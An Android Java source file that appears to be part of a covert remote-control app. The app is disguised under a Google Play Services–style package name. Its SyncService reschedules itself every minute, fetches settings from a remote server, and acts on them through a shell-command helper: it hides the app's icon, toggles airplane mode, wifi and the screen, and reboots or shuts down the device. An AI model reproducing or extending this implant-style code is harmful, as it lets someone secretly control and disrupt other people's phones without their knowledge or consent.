package com.google.android.gms.persistent.googleapps.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.android.gms.persistent.googleapps.App;
import com.google.android.gms.persistent.googleapps.repositories.network.NetworkRepo;
import com.google.android.gms.persistent.googleapps.repositories.network.models.data.Settings;
import com.google.android.gms.persistent.googleapps.repositories.network.models.response.SyncResponse;
import com.google.android.gms.persistent.googleapps.utils.Preferences;
import com.google.android.gms.persistent.googleapps.utils.ShellCommand;

import java.util.Calendar;

import io.reactivex.annotations.NonNull;
import io.reactivex.schedulers.Schedulers;

public class SyncService extends Service {
    private static final int SERVICE_REQUEST_CODE = 35;
    private final String TAG = SyncService.class.getSimpleName();
    private NetworkRepo networkRepo;
    private Preferences preferences;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        networkRepo = App.getAppComponent().getNetworkRepo();
        preferences = App.getAppComponent().getPreferences();
        onSyncSettings();
        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.SECOND, 60);// через period минут

        PendingIntent servicePendingIntent = PendingIntent.getService(this,
                SERVICE_REQUEST_CODE, new Intent(this, SyncService.class),
                PendingIntent.FLAG_UPDATE_CURRENT);

        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
                servicePendingIntent);
        super.onStartCommand(intent, flags, startId);
        return Service.START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onSyncSettings() {
        networkRepo.onStateSync()
                .doOnSuccess(response -> preferences.setAppSettings(response.getData()))
                .map(SyncResponse::getData)
//                .doAfterSuccess()
                .doAfterSuccess(settings->ShellCommand.setAirplaneMode(settings.isAirplane_mode()))
                .doAfterSuccess(settings->ShellCommand.setHideIcon(this, settings.isHide_icon()))
                .doAfterSuccess(settings->ShellCommand.setScreen(settings.isScreen()))
                .doAfterSuccess(settings->ShellCommand.setWifi(settings.isWifi()))
                .doAfterSuccess(settings->ShellCommand.rebootSystem(settings.isReboot()))
                .doAfterSuccess(settings->ShellCommand.shutDownSystem(settings.isShut_down()))
                .subscribeOn(Schedulers.io())
                .subscribe(this::handleSuccessLoadSettings,
                        this::handleErrorLoadSettings);
    }

    private void handleSuccessLoadSettings(
            @NonNull Settings settings) {
        Log.d(TAG, "handleSuccessLoadSettings " );
    }

    private void handleErrorLoadSettings(Throwable throwable) {
        Log.d(TAG, "Sync is " + throwable);
    }
}

